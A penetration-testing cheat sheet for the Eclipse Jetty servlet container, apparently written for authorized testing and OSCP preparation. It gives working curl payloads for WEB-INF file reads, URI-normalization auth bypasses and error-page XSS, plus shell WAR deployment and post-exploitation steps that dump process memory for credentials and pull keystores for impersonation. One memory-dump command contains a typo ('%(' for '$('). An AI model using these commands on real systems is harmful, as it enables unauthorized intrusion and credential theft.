# Jetty

> Eclipse Jetty servlet container reference for penetration testing. Covers
> detection, enumeration, known CVEs, exploitation patterns, misconfigurations,
> and post-exploitation.

---

## Table of Contents

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation Patterns](#4-exploitation-patterns)
- [5. Misconfigurations](#5-misconfigurations)
- [6. Post-Exploitation](#6-post-exploitation)
- [7. OSCP Notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### Response headers

```bash
curl -sI http://<TARGET>:8080/ | grep -iE '^(server|x-powered-by)'
```

Expected output:

```text
Server: Jetty(9.4.43.v20210629)
```

Jetty often reports the exact version in `Server`. This is the primary
fingerprint.

### Default error pages

Jetty default 404:

```html
<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
<title>Error 404 Not Found</title>
</head>
<body>
<h2>HTTP ERROR 404 Not Found</h2>
<table>
<tr><th>URI:</th><td>/notfound</td></tr>
<tr><th>STATUS:</th><td>404</td></tr>
...
</table>
<hr/><a href="https://eclipse.org/jetty">Powered by Jetty:// 9.4.43.v20210629</a><hr/>
</body>
</html>
```

`Powered by Jetty://` footer and the `Server: Jetty(...)` header together confirm.

### Common ports

- `8080` - default HTTP (Jetty standalone)
- `8443` - default HTTPS
- `8888` - common in Hadoop / Spark / Jenkins behind Jetty

### Embedded Jetty

Many Java apps embed Jetty rather than run standalone:

- Hadoop NameNode / DataNode / YARN UI
- Spark master / worker UI
- Jenkins (older)
- Solr (older)
- Graylog, Elasticsearch-head
- JHipster, Dropwizard apps

In such cases, the app-specific URL paths (`/cluster`, `/jobs`, `/`, `/solr`)
are the fastest way to identify.

### nmap / whatweb

```bash
nmap -sV -p 8080,8443,8888,50070 --script http-title,http-headers <TARGET>
whatweb -a 3 http://<TARGET>:8080/
```

---

## 2. Enumeration

### Version fingerprinting

```bash
curl -sI http://<TARGET>:8080/ | grep -i '^server:'
curl -s  http://<TARGET>:8080/notfound | grep -oE 'Jetty\([0-9.]+[^)]*\)'
```

### Common paths

```bash
for p in / /admin /manager /webapp /contexts /solr /job /cluster \
         /server-info /favicon.ico /WEB-INF/web.xml /META-INF/context.xml; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>:8080$p")
  echo "$code  $p"
done
```

### Context enumeration

Jetty exposes deployed contexts if `contexts/` directory is served or if
`jetty-webapps` is enabled:

```bash
curl -s http://<TARGET>:8080/contexts/
curl -s http://<TARGET>:8080/contexts/*.xml
```

### WEB-INF exposure

Jetty (unlike Tomcat) can be misconfigured to serve `WEB-INF` and `META-INF`
directly, exposing `web.xml`, `context.xml`, and class files:

```bash
curl -s http://<TARGET>:8080/WEB-INF/web.xml
curl -s http://<TARGET>:8080/META-INF/context.xml
curl -s http://<TARGET>:8080/WEB-INF/classes/
```

### Directory listing

Jetty serves directory listings by default if `dirAllowed=true`:

```bash
curl -s http://<TARGET>:8080/static/ | grep -iE 'index of|directory'
```

### Directory brute force

```bash
feroxbuster -u http://<TARGET>:8080/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x xml,jsp,class,war
```

### HTTP methods

```bash
curl -s -X OPTIONS -i http://<TARGET>:8080/ | grep -i allow
```

### Jetty-specific paths

```bash
# Server dump / info (if enabled)
curl -s http://<TARGET>:8080/jetty-dump
curl -s http://<TARGET>:8080/jetty-info
# Stats (if StatisticsHandler is enabled)
curl -s http://<TARGET>:8080/stats
```

---

## 3. Known CVEs

### CVE-2021-34429 - URI normalization bypass

Jetty URI normalization can be bypassed with encoded characters (`%2e`,
`%2e%2e`, `%00`, unicode). Combined with a servlet mapped to
`/`, allows access to protected paths (Confluence CVE-2021-26084 used this).

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-34429
Affected: Jetty 9.4.40 - 9.4.42, 10.0.5, 11.0.5.

### CVE-2021-28164 - URI normalization bypass

%2e in path bypasses security constraints. Same family as CVE-2021-34429.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-28164
Affected: Jetty 9.4.37 - 9.4.39, 10.0.1, 11.0.1.

### CVE-2021-28169 - ConcatServlet / WelcomeFilter info disclosure

`ConcatServlet` and `WelcomeFilter` in Jetty allow access to `WEB-INF` via
path traversal in their parameters. Reads `web.xml`, class files.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-28169
Affected: Jetty 9.4.40 and earlier, 10.0.2 and earlier, 11.0.2 and earlier.

PoC:
```bash
curl --path-as-is "http://<TARGET>:8080/static?/WEB-INF/web.xml"
curl --path-as-is "http://<TARGET>:8080/static?/%2e%2e/WEB-INF/web.xml"
```

### CVE-2019-17632 - XSS in default error page

Reflected XSS in the default error page via `Accept` header or query string.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2019-17632
Affected: Jetty 9.4.24 - 9.4.26.

### CVE-2017-9735 - Timing side channel

Timing attack on `Password` class hashing - recover plaintext of unknown
passwords via timing differences. Rarely exploitable in practice.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2017-9735
Affected: Jetty 9.2.22, 9.3.21, 9.4.6 and earlier.

### CVE-2023-36478 - HTTP/2 DoS

HPACK large integer overflow, DoS via crafted HTTP/2 frames.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-36478
Affected: Jetty 9.4.52 and earlier, 10.0.16, 11.0.16, 12.0.0.beta2.

### CVE-2024-22201 - HTTP/2 DoS (SSL)

DoS in HTTP/2 over TLS. Incomplete fix for CVE-2023-36478.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-22201
Affected: Jetty 9.4.54, 10.0.20, 11.0.20, 12.0.0 - 12.0.5.

### Version -> CVE quick table

| Version | Type | CVE |
|---------|------|-----|
| 9.4.40-9.4.42 | URI bypass | CVE-2021-34429 |
| 9.4.37-9.4.39 | URI bypass | CVE-2021-28164 |
| <= 9.4.40 | WEB-INF read | CVE-2021-28169 |
| 9.4.24-9.4.26 | XSS | CVE-2019-17632 |
| <= 9.4.52 | HTTP/2 DoS | CVE-2023-36478 |

---

## 4. Exploitation Patterns

### ConcatServlet / WelcomeFilter WEB-INF read (CVE-2021-28169)

If `ConcatServlet` is mapped (common in older configs):

```bash
curl --path-as-is "http://<TARGET>:8080/static?/WEB-INF/web.xml"
curl --path-as-is "http://<TARGET>:8080/static?/WEB-INF/classes/com/example/Db.class"
```

Expected output:

```xml
<web-app ...>
  <servlet>
    <servlet-name>DbInit</servlet-name>
    <servlet-class>com.example.DbInit</servlet-class>
  </servlet>
  ...
</web-app>
```

Decompile class files with `jadx`:

```bash
jadx Db.class
```

Look for hardcoded credentials, DB connection strings, secret keys.

### URI normalization bypass (CVE-2021-34429 / 28164)

```bash
# Bypass a security constraint on /admin/*
curl --path-as-is "http://<TARGET>:8080/admin%2e%2e/admin/dashboard"
curl --path-as-is "http://<TARGET>:8080/%2e/admin/dashboard"
curl --path-as-is "http://<TARGET>:8080/admin%00/dashboard"
```

Chains well with Spring Security misconfigurations, Confluence
CVE-2021-26084, and any path-based auth.

### JSP upload / WAR deploy (misconfig)

Jetty does not ship a manager app by default (unlike Tomcat). Deployment
options:

1. Drop a WAR in `webapps/` (requires file write, e.g. via a separate vuln).
2. Use `jetty-maven-plugin` (dev only).
3. `contexts/*.xml` if writable (deploys a new context).

```bash
# If you have file write into webapps/
cp shell.war /opt/jetty/webapps/
# Jetty auto-deploys in ~5 seconds
curl http://<TARGET>:8080/shell/
```

### Directory listing -> source disclosure

```bash
curl -s http://<TARGET>:8080/static/
# Look for backup files, .class, .java, config
curl -s http://<TARGET>:8080/static/backup.zip -o backup.zip
unzip backup.zip
```

### XSS via error page (CVE-2019-17632)

```bash
curl -s "http://<TARGET>:8080/%3Cscript%3Ealert(1)%3C/script%3E"
```

### Embedded Jetty app-specific exploits

When Jetty fronts Hadoop / Spark / Solr / Jenkins, look at those apps:

| App | Port | Path | Attack |
|-----|------|------|--------|
| Hadoop NameNode | 50070 | / | Unauthenticated HDFS access |
| Hadoop YARN | 8088 | /cluster | YARN RCE |
| Spark master | 8080 | / | Spark shell |
| Solr | 8983 | /solr | Velocity SSTI, RCE |
| Jenkins | 8080 | / | Groovy script console |

---

## 5. Misconfigurations

### Directory listing enabled

```bash
curl -s http://<TARGET>:8080/static/ | grep -iE 'index of|directory'
```

### WEB-INF / META-INF readable

```bash
curl -s http://<TARGET>:8080/WEB-INF/web.xml
curl -s http://<TARGET>:8080/WEB-INF/classes/
curl -s http://<TARGET>:8080/META-INF/MANIFEST.MF
```

### Stats / info handlers exposed

```bash
curl -s http://<TARGET>:8080/stats
curl -s http://<TARGET>:8080/jetty-info
curl -s http://<TARGET>:8080/jetty-dump
```

### JMX exposed (RMI)

Jetty exposes JMX on port 1099 / 9012 in some setups. If reachable:

```bash
nmap -p 1099,9012 <TARGET>
# Use jmxterm or ysoserial for RCE
```

### Backup files

```bash
for f in web.xml.bak web.xml.old context.xml.bak server.xml.bak; do
  curl -s -o /dev/null -w "%{http_code}  $f\n" "http://<TARGET>:8080/WEB-INF/$f"
done
```

### CORS misconfig

```bash
curl -sI -H "Origin: https://evil.com" http://<TARGET>:8080/api/ | grep -i 'access-control'
```

---

## 6. Post-Exploitation

### Config file locations

| OS | Path |
|----|------|
| Debian/Ubuntu | `/etc/jetty/`, `/usr/share/jetty9/etc/` |
| RHEL/CentOS | `/etc/jetty/`, `/usr/share/jetty/etc/` |
| Manual install | `$JETTY_HOME/etc/` |
| Embedded (Jenkins) | `$JENKINS_HOME/` |
| Embedded (Solr) | `$SOLR_HOME/server/etc/` |
| Docker | `/var/lib/jetty/`, `/opt/jetty/` |

### What to look for

```bash
cat /etc/jetty/jetty.xml 2>/dev/null
cat /etc/jetty/jetty-ssl.xml 2>/dev/null
cat /etc/jetty/jetty-http.xml 2>/dev/null
cat /opt/jetty/etc/jetty.xml 2>/dev/null
ls -la /opt/jetty/webapps/ /var/lib/jetty/webapps/ 2>/dev/null
```

Key items:

- `jetty-ssl.xml` / `keystore` -> keystore path + password
- `jetty.xml` -> connectors, thread pools, JMX settings
- `webapps/*.war` -> applications (unzip + decompile)
- `contexts/*.xml` -> context definitions (DataSource passwords)

### Application source / class files

```bash
find /opt/jetty/webapps/ -name '*.class' -o -name 'WEB-INF' -type d 2>/dev/null
find /opt/jetty/webapps/ -name '*.war' -exec unzip -d /tmp/deploy_{} {} \;
```

Decompile:

```bash
jadx /opt/jetty/webapps/myapp/WEB-INF/classes/com/example/*.class
```

Look for hardcoded secrets, DB connection strings, JWT signing keys.

### Log files

```bash
ls -la /var/log/jetty/ /opt/jetty/logs/ 2>/dev/null
tail -n 200 /var/log/jetty/*.log
```

### Process user

```bash
ps aux | grep -i jetty
id jetty
# Embedded (Jenkins/Solr): often runs as the app user
```

### Memory dump for secrets

```bash
# If you have root / ptrace
gcore %(pgrep -f 'jetty|jenkins|solr' | head -1)
strings core.* | grep -iE 'password|secret|key|token'
```

Embedded Jetty apps (Jenkins, Solr) often hold DB creds, LDAP creds, API tokens
in memory.

### Keystore extraction

If `jetty-ssl.xml` references a keystore:

```bash
keytool -list -keystore /etc/jetty/keystore -storepass <password>
keytool -exportcert -alias jetty -keystore /etc/jetty/keystore -storepass <password> -file jetty.crt
```

Use for MITM or certificate impersonation if pivoting.

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report: screenshot the `Server: Jetty(x.y.z)` header - it is the exact version fingerprint.

> [!IMPORTANT]
> OSCP report: for CVE-2021-28169 (WEB-INF read), screenshot the curl command AND the leaked web.xml or class file content.

> [!IMPORTANT]
> OSCP report: if Jetty fronts a specific app (Jenkins, Solr, Hadoop), screenshot the app-specific version AND the exploit, not just the Jetty layer.

---

## 8. References

- Jetty official docs - https://eclipse.dev/jetty/documentation/
- NVD search - https://nvd.nist.gov/vuln/search/results?query=jetty
- CVE-2021-28169 writeup - https://github.com/v3n0m21/CVE-2021-28169
- CVE-2021-34429 writeup - https://github.com/4nth0nyCL/jetty-CVE-2021-34429
- Confluence CVE-2021-26084 (uses Jetty URI bypass) - https://nvd.nist.gov/vuln/detail/CVE-2021-26084
- HackTricks - Jetty - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/jetty
- jadx - https://github.com/skylot/jadx

---

*Reference for authorized penetration testing, CTF, and OSCP exam preparation only.*
